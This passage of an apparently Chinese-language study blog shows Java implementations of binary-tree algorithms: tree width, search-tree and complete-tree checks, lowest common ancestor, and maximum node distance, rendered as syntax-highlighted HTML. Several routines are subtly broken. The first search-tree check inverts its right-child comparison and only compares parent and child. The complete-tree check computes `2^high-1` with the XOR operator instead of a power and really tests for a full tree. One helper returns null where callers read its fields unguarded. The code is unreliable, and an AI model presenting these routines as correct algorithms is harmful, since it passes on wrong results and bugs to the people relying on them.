                map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>pop<span class="token punctuation">.</span>left<span class="token punctuation">,</span> level <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>pop<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>pop<span class="token punctuation">.</span>right <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>pop<span class="token punctuation">.</span>right<span class="token punctuation">,</span> level <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>pop<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"最多节点数："</span> <span class="token operator">+</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>max<span class="token punctuation">,</span> curNum<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p><strong>判断是否为搜索二叉树</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//判断二叉树为搜索二叉树   左子节点的值 &lt;= 当前节点的值 &lt;= 右子节点的值</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">isSearchTree</span><span class="token punctuation">(</span><span class="token class-name">Point</span> tree<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">//使用中序遍历</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>tree <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>tree<span class="token punctuation">.</span>left <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>tree<span class="token punctuation">.</span>left<span class="token punctuation">.</span>value <span class="token operator">>=</span> tree<span class="token punctuation">.</span>value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"不是搜索二叉树"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token function">isSearchTree</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>tree<span class="token punctuation">.</span>right <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>tree<span class="token punctuation">.</span>value <span class="token operator">&lt;=</span> tree<span class="token punctuation">.</span>right<span class="token punctuation">.</span>value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"不是搜索二叉树"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token function">isSearchTree</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"是搜索二叉树"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p><strong>判断是否为完整二叉树</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//判断是否为完全二叉树  也就是要树是完整拥有左右子节点的 ，要么从左至右 填补叶节点</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">isCompleteBinaryTree</span><span class="token punctuation">(</span><span class="token class-name">Point</span> tree<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">//1.只要有右不左子节点 就是说明不是</span>
    <span class="token comment">//2.满足1条件后，如果遇到只有左子节点的，则同层节点后面必须没有子节点</span>
    <span class="token comment">//需要宽度遍历  使用队列</span>
    <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Point</span><span class="token punctuation">></span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>tree<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Point</span> test <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Point</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Point</span> finPoint <span class="token operator">=</span> test<span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>list<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Point</span> pop <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>pop <span class="token operator">==</span> finPoint<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>list<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"不是完全二叉树"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>pop<span class="token punctuation">.</span>left <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> pop<span class="token punctuation">.</span>right <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"不是完全二叉树"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>pop<span class="token punctuation">.</span>left <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>pop<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>test <span class="token operator">==</span> finPoint <span class="token operator">&amp;&amp;</span> pop<span class="token punctuation">.</span>right <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                finPoint <span class="token operator">=</span> pop<span class="token punctuation">.</span>left<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>pop<span class="token punctuation">.</span>right <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>pop<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"是完全二叉树"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p><strong>套路判断是否为搜索二叉树</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//用二叉树套路解决是否为搜索二叉树</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">isSearchTreeByMethod</span><span class="token punctuation">(</span><span class="token class-name">Point</span> tree<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">//左边为搜索二叉树</span>
        <span class="token comment">//右边为搜索二叉树</span>
        <span class="token comment">//左边值&lt;当前值&lt;右边值  所以我们需要知道左右两边的值  使用后序遍历</span>
        <span class="token keyword">boolean</span> isSearch <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>tree<span class="token punctuation">)</span><span class="token punctuation">.</span>isSearch<span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>isSearch<span class="token operator">?</span><span class="token string">"是搜索二叉树"</span><span class="token operator">:</span><span class="token string">"不是搜索二叉树"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">ReturnType</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">int</span> min<span class="token punctuation">;</span>
        <span class="token keyword">int</span> max<span class="token punctuation">;</span>
        <span class="token keyword">boolean</span> isSearch<span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token class-name">ReturnType</span><span class="token punctuation">(</span><span class="token keyword">int</span> min<span class="token punctuation">,</span><span class="token keyword">int</span> max<span class="token punctuation">,</span><span class="token keyword">boolean</span> isSearch<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>min <span class="token operator">=</span> min<span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>max <span class="token operator">=</span> max<span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>isSearch <span class="token operator">=</span> isSearch<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">ReturnType</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token class-name">Point</span> head<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>head<span class="token operator">==</span><span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token class-name">ReturnType</span> <span class="token class-name">LeftData</span> <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ReturnType</span> <span class="token class-name">RightData</span> <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> min <span class="token operator">=</span> head<span class="token punctuation">.</span>value<span class="token punctuation">;</span>
        <span class="token keyword">int</span> max <span class="token operator">=</span> head<span class="token punctuation">.</span>value<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>head<span class="token punctuation">.</span>left<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">//当前值  与  左节点的最小值  比较</span>
            min <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>min<span class="token punctuation">,</span><span class="token class-name">LeftData</span><span class="token punctuation">.</span>min<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">//当前值  与  左节点的最大值  比较</span>
            max <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>max<span class="token punctuation">,</span> <span class="token class-name">LeftData</span><span class="token punctuation">.</span>max<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>head<span class="token punctuation">.</span>right<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">//最小值  与  右节点的最小值  比较</span>
            min <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>min<span class="token punctuation">,</span><span class="token class-name">RightData</span><span class="token punctuation">.</span>min<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">//最大值  与  右节点的最大值  比较</span>
            max <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>max<span class="token punctuation">,</span><span class="token class-name">RightData</span><span class="token punctuation">.</span>max<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">boolean</span> isSearch <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">LeftData</span><span class="token operator">!=</span><span class="token keyword">null</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">LeftData</span><span class="token punctuation">.</span>isSearch<span class="token operator">||</span><span class="token class-name">LeftData</span><span class="token punctuation">.</span>max <span class="token operator">>=</span> head<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            isSearch <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">RightData</span><span class="token operator">!=</span><span class="token keyword">null</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">RightData</span><span class="token punctuation">.</span>isSearch<span class="token operator">||</span><span class="token class-name">RightData</span><span class="token punctuation">.</span>min<span class="token operator">&lt;=</span> head<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            isSearch <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ReturnType</span><span class="token punctuation">(</span>min<span class="token punctuation">,</span>max<span class="token punctuation">,</span>isSearch<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p><strong>套路判断是否为完全二叉树</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//用套路解决是否为完全二叉树</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">isCBT</span><span class="token punctuation">(</span><span class="token class-name">Point</span> tree<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ReturnType</span> process <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>tree<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>isCBT<span class="token operator">?</span><span class="token string">"是完全二叉树"</span><span class="token operator">:</span><span class="token string">"不是完全二叉树"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">ReturnType</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">//节点高度</span>
        <span class="token keyword">int</span> high<span class="token punctuation">;</span>
        <span class="token comment">//节点个数</span>
        <span class="token keyword">int</span> <span class="token class-name">Num</span><span class="token punctuation">;</span>
        <span class="token comment">//是否为完全二叉树</span>
        <span class="token keyword">boolean</span> isCBT<span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token class-name">ReturnType</span><span class="token punctuation">(</span><span class="token keyword">int</span> high<span class="token punctuation">,</span> <span class="token keyword">int</span> num<span class="token punctuation">,</span> <span class="token keyword">boolean</span> isCBT<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>high <span class="token operator">=</span> high<span class="token punctuation">;</span>
            <span class="token class-name">Num</span> <span class="token operator">=</span> num<span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>isCBT <span class="token operator">=</span> isCBT<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">ReturnType</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token class-name">Point</span> head<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ReturnType</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token class-name">ReturnType</span> leftData <span class="token operator">=</span> <span class="token keyword">null</span> <span class="token punctuation">;</span>
        <span class="token class-name">ReturnType</span> rightData <span class="token operator">=</span> <span class="token keyword">null</span> <span class="token punctuation">;</span>
        <span class="token keyword">int</span> high <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> num <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">boolean</span> isCBT <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>head<span class="token punctuation">.</span>left <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> head<span class="token punctuation">.</span>right<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            leftData <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>
            rightData <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>
            high <span class="token operator">=</span> leftData<span class="token punctuation">.</span>high<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>
            num <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">leftData<span class="token punctuation">.</span></span>Num</span><span class="token operator">+</span> <span class="token class-name"><span class="token namespace">rightData<span class="token punctuation">.</span></span>Num</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>leftData<span class="token punctuation">.</span>isCBT<span class="token operator">||</span><span class="token operator">!</span>rightData<span class="token punctuation">.</span>isCBT<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ReturnType</span><span class="token punctuation">(</span>high<span class="token punctuation">,</span>num<span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token comment">//层数  与  节点个数呈  N=2^L - 1</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">^</span>high<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">==</span>num<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                isCBT <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ReturnType</span><span class="token punctuation">(</span>high<span class="token punctuation">,</span> num<span class="token punctuation">,</span> isCBT<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p><strong>套路寻找两个节点的交汇处，也就是给出一个树，给两个点，寻找点的共同交汇处</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//寻找两个节点的交会点</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Point</span> <span class="token class-name">FindCommon</span> <span class="token punctuation">(</span><span class="token class-name">Point</span> head<span class="token punctuation">,</span><span class="token class-name">Point</span> node1<span class="token punctuation">,</span><span class="token class-name">Point</span> node2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span><span class="token operator">||</span>head <span class="token operator">==</span> node1<span class="token operator">||</span>head <span class="token operator">==</span> node2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> head<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token class-name">Point</span> left <span class="token operator">=</span> <span class="token class-name">FindCommon</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>left<span class="token punctuation">,</span> node1<span class="token punctuation">,</span> node2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Point</span> right <span class="token operator">=</span> <span class="token class-name">FindCommon</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>right<span class="token punctuation">,</span> node1<span class="token punctuation">,</span> node2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>left<span class="token operator">!=</span><span class="token keyword">null</span><span class="token operator">&amp;&amp;</span>right<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> head<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> left<span class="token operator">==</span><span class="token keyword">null</span><span class="token operator">?</span>right<span class="token operator">:</span>left<span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p><strong>二叉树节点间的最大距离（从树上某个点到另一个点最大距离，一个点到相邻一个点的距离为1）</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//二叉树节点间最大距离</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">ReturnTypeByMaxLen</span> <span class="token function">maxLength</span><span class="token punctuation">(</span><span class="token class-name">Point</span> hear<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>hear <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ReturnTypeByMaxLen</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token class-name">ReturnTypeByMaxLen</span> left <span class="token operator">=</span> <span class="token function">maxLength</span><span class="token punctuation">(</span>hear<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ReturnTypeByMaxLen</span> right <span class="token operator">=</span> <span class="token function">maxLength</span><span class="token punctuation">(</span>hear<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//当前节点不参与  左节点最大距离  与  右节点最大距离比较</span>
        <span class="token keyword">int</span> maxDistance <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>left<span class="token punctuation">.</span>maxConnect<span class="token punctuation">,</span> right<span class="token punctuation">.</span>maxConnect<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//最大距离值与当前节点参与时  进行比较</span>
        maxDistance <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>maxDistance<span class="token punctuation">,</span> left<span class="token punctuation">.</span>maxDeepLen<span class="token operator">+</span><span class="token number">1</span><span class="token operator">+</span> right<span class="token punctuation">.</span>maxDeepLen<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//向上一层  深度+1</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ReturnTypeByMaxLen</span><span class="token punctuation">(</span><span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>left<span class="token punctuation">.</span>maxDeepLen<span class="token punctuation">,</span> right<span class="token punctuation">.</span>maxDeepLen<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>maxDistance<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">ReturnTypeByMaxLen</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">//最大深度</span>
        <span class="token keyword">int</span> maxDeepLen<span class="token punctuation">;</span>
        <span class="token comment">//节点最大距离</span>
        <span class="token keyword">int</span> maxConnect<span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token class-name">ReturnTypeByMaxLen</span><span class="token punctuation">(</span><span class="token keyword">int</span> maxDeepLen<span class="token punctuation">,</span> <span class="token keyword">int</span> maxConnect<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
